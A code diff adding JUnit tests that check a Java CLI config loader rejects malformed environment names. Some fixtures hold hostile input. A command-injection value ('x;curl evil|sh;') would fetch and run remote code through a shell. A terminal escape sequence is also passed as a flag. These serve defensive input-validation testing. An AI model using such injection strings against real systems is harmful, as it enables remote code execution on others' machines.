@@ -115,4 +115,32 @@ class CliConfigTest {
         assertEquals("https://staging.example.com", cfg.url());
         assertEquals("staging", cfg.env());
     }
+
+    @Test
+    void rejectsShellMetacharactersInOpsEnv() throws Exception {
+        Files.writeString(tmp.resolve(".brace"), "ops.env=x;curl evil|sh;\nops.x;curl evil|sh;.url=http://a\n");
+        var e = assertThrows(java.io.IOException.class, () -> CliConfig.load(tmp, new String[]{}));
+        assertTrue(e.getMessage().contains("Invalid env name"), e.getMessage());
+    }
+
+    @Test
+    void rejectsInvalidEnvFlagAndDoesNotEchoControlChars() {
+        var e = assertThrows(java.io.IOException.class,
+            () -> CliConfig.load(tmp, new String[]{"--env", "a\u001b]0;pwn\u0007", "--json"}));
+        assertTrue(e.getMessage().chars().noneMatch(c -> c < 0x20 || c == 0x7f), e.getMessage());
+    }
+
+    @Test
+    void rejectsOverlongAndEmptyEnv() throws Exception {
+        assertThrows(java.io.IOException.class,
+            () -> CliConfig.load(tmp, new String[]{"--env", "a".repeat(33), "--json"}));
+        assertThrows(java.io.IOException.class,
+            () -> CliConfig.load(tmp, new String[]{"--env", "", "--json"}));
+    }
+
+    @Test
+    void acceptsOrdinaryEnvNames() throws Exception {
+        Files.writeString(tmp.resolve(".brace"), "ops.eu-west_2.url=http://a\nops.env=eu-west_2\n");
+        assertEquals("eu-west_2", CliConfig.load(tmp, new String[]{}).env());
+    }
 }
